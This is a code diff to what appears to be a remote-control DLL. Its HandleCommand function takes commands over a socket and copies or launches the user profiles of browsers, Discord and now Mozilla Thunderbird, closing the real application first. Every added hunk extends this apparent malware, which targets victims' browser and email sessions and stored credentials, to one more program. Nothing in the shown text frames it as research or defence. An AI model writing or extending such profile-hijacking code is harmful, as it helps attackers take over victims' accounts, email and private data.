@@ -1938,6 +1938,8 @@ static wstring get_gecko_profile_path(const wstring& browserName) {
         path += L"\\Waterfox";
     } else if (browserName == L"LibreWolf") {
         path += L"\\LibreWolf";
+    } else if (browserName == L"Thunderbird") {
+        path += L"\\Thunderbird";
     } else {
         return L"";
     }
@@ -2154,11 +2156,13 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                               wRequestedPath == L"Opera" ||
                               wRequestedPath == L"Opera GX" ||
                               wRequestedPath == L"Brave" ||
-                              wRequestedPath == L"Discord");
+                              wRequestedPath == L"Discord" ||
+                              wRequestedPath == L"Thunderbird");
 
             bool isGecko = (wRequestedPath == L"Firefox" ||
                             wRequestedPath == L"Waterfox" ||
-                            wRequestedPath == L"LibreWolf");
+                            wRequestedPath == L"LibreWolf" ||
+                            wRequestedPath == L"Thunderbird");
 
             if (isBrowser) {
                 thread([wRequestedPath, copyProfile, isGecko, closeReal]() {
@@ -2175,6 +2179,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     else if (wRequestedPath == L"Opera GX") exeName = L"opera.exe";
                     else if (wRequestedPath == L"Brave") exeName = L"brave.exe";
                     else if (wRequestedPath == L"Discord") exeName = L"discord.exe";
+                    else if (wRequestedPath == L"Thunderbird") exeName = L"thunderbird.exe";
 
                     if (closeReal && !exeName.empty()) {
                         send_status("Mevcut uygulama kapatılıyor...");
@@ -2245,6 +2250,9 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                                 exePath = L"C:\\Program Files\\Waterfox\\waterfox.exe";
                             } else if (wRequestedPath == L"LibreWolf") {
                                 exePath = L"C:\\Program Files\\LibreWolf\\librewolf.exe";
+                            } else if (wRequestedPath == L"Thunderbird") {
+                                exePath = L"C:\\Program Files\\Mozilla Thunderbird\\thunderbird.exe";
+                                if (!fs::exists(exePath)) exePath = L"C:\\Program Files (x86)\\Mozilla Thunderbird\\thunderbird.exe";
                             }
                         }
                     }
